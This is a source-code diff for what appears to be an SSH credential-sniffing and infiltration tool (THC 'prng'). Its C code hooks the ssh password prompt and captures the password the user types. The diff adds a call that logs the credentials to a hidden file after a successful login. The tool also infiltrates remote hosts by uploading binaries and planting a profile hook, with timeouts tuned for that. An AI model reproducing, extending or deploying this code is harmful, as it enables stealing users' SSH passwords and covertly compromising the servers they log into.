@@ -34,6 +34,7 @@ static int g_db_trysec;
 static bool g_is_ssh;
 static bool g_is_sudo;
 static bool g_is_skip_line;
+static uint64_t g_usec_start;
 
 // Timeout for infiltrating process
 // Wait 30 seconds at any prompt for real user input
@@ -50,7 +51,8 @@ static bool g_is_skip_line;
 // Continue immediatley when THCPROFILE is received.
 #define THC_TO_WAIT_PASSWORD_AUTH_MSEC       (1 * 1000)
 // Give infiltrating process 1 second to complete profile infiltration (after THCINSIDE)
-#define THC_TO_WAIT_INF_COMPLETE_MSEC        (1 * 1000)
+// On RPI it can take more than 1 second between THCINSIDE and THCPROFILE
+#define THC_TO_WAIT_INF_COMPLETE_MSEC        (2 * 1000)
 // Give infiltrating process 15 seconds to complete its job (upload all binaries etc)
 #define THC_TO_WAIT_FINISH_MSEC              (15 * 1000)
 // Give infiltrating process 2 more seconds even if real ssh has finished.
@@ -62,7 +64,7 @@ static uint64_t g_i_expire;         // start + 2 seconds
 #define THC_LOG_DIRNAME       ".l"                 // ~/.prng/.l
 #define THC_INF_STAGE_INSIDE  "THCINSIDE"
 #define THC_INF_STAGE_PROFILE "THCPROFILE"
-#define THC_INF_STAGE_FIN     "THCFINISHED"
+// #define THC_INF_STAGE_FIN     "THCFINISHED"
 #define THC_RECHECK_TIME      (60 * 60 * 24 * 14)  // Every 14 days re-check infiltration
 #define THC_DB_TRY_SEC        (60 * 60 * 12)      // Wait at least 12h before trying again
 
@@ -117,6 +119,8 @@ static bool strstr_password(char *str);
 static void set_state_password_captured(char *pwd);
 static void pty_ssh_start(void);
 static int db_update(const char *dbname);
+static void log_ssh_credentials(void);
+
 
 static void
 timeout_update(int msec, enum _expire_state_t state, enum _expire_action_t action)
@@ -184,6 +188,7 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	g_db_trysec = THC_DB_TRY_SEC;
 	g_is_pty_pause = false;
 	g_is_skip_line = false;
+	g_usec_start = THC_usec();
 
 	if (getenv("THC_DEBUG"))
 	{
@@ -425,6 +430,9 @@ match_stage_inside(const char *str)
 	if (ret == 0)
 		return false;
 
+	// Login was a success.
+	log_ssh_credentials();
+
 	// Password input no longer needed. Set to raw so that we can transfer binaries.
 	stty_set_raw(fd_i);
 
@@ -610,20 +618,21 @@ static void
 log_ssh_credentials(void)
 {
 	FILE *fp;
-	char buf[1024];
+	char buf[1024 * 2 + 10];
 
-	DEBUGF("LOG SSH CREDENTIALS ***\n");
 	if (g_host_id == NULL)
 	{
-		DEBUGF("g_host_id=NULL\n");
+		DEBUGF("%s g_host_id=NULL\n", __func__);
 		return; // not ssh sniffing
 	}
 
 	if (g_is_already_logged_ssh_credentials)
 	{
-		DEBUGF("Already logged\n");
+		DEBUGF("%s Already logged\n", __func__);
 		return;
 	}
+
+	DEBUGF("LOG SSH CREDENTIALS ***\n");
 
 	// This file might be 'sourced' by bash and thus shall be bash-compliant
 	snprintf(buf, sizeof buf, "%s/ssh-%s.pwd", g.db_basedir, g_host_id);
@@ -681,11 +690,11 @@ log_ssh_credentials(void)
 	//   - If password was previously captured then just output it.
 	//   - Otherwise (faillure) fall-back to original SSH_ASKPASS
 	if (askpass == NULL)
-		buf[0] = '\0';
+		snprintf(buf, sizeof buf, "%.1024s %.1024s", g.ssh_param, g.ssh_destination);
 	else
-		snprintf(buf, sizeof buf, "# SSH_ASPASS=-NOT_SUPPORTED- ");
+		buf[0] = '\0'; // FIXME: add SSH_ASKPASS support
 
-	fprintf(fp, "# %s%s %s %s\n", buf, g.target_file, g.ssh_param, g.ssh_destination);
+	fprintf(fp, "# %s\n", buf);
 	fclose(fp);
 
 	g_is_already_logged_ssh_credentials = true;
@@ -1292,7 +1301,7 @@ cb_lnbuf_infiltrate_ssh(void *lptr, void *arg_UNUSED)
 {
 	LNBUF *l = (LNBUF *)lptr;
 
-	DEBUGF("I: HOOK='%s' (stage=%d)\n", LNBUF_line(l), stage_i);
+	DEBUGF("%0.06f I: HOOK='%s' (stage=%d)\n", (double)(THC_usec() - g_usec_start) / (1000 * 1000), LNBUF_line(l), stage_i);
 
 	// Any full line means it can not be a password prompt (because 
 	// password prompts never end with '\n'
